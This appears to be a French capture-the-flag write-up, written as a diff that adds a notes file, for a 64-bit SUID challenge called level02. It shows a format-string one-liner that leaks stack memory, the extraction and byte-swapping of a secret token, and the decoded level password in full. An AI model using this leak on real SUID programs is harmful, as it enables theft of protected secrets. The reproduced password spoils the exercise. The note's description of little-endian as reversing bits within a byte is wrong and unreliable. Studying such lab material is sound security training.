@@ -1,0 +1,29 @@
+Idee generale : le token est lu des le debut, donc stocké quelque part => il s'agit d'aller le lire (en utilisant le printf final)
+
+A noter :
+    - le fichier est en 64-bits
+    - gdb a priori vain, car on quitte le programme si on ne peut pas lire le fichier (SUID)
+
+- on imprime un maximum de long x de ma stack (car 64-bits)
+
+    (python -c 'print "%lx"*150'; echo "") | ./level02
+
+- on repere :
+    - 2a = '*'
+    - 786c25 => 'x' 'l' '%'
+    - on enleve donc toutes ces parties la + le 0 avant (\0 fin de string) et apres
+    - on se retrouve donc avec 756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394d (longueur 80 = parfait)
+    => c'est surement le token
+
+- on le convertit : 
+
+    - Je sais que je suis en Little Endian (l’ordre des mes bits dans un byte est inversé - exemple : 
+        - si dans ma memoire j’ai : 01234567 abcdefgh ABCDEFGH
+        - pour le convertir en LE : 76543210 hgfedcba HGFEDCBA
+
+    - Donc, je decoupe : 
+        756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d
+    - En Little Endian, ca donne :
+        4868373452506E75 51397361354A4145 58674E5743717A37 7358476E68354A35 4D394B6650673348
+    - en ASCII, ca donne :
+        Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
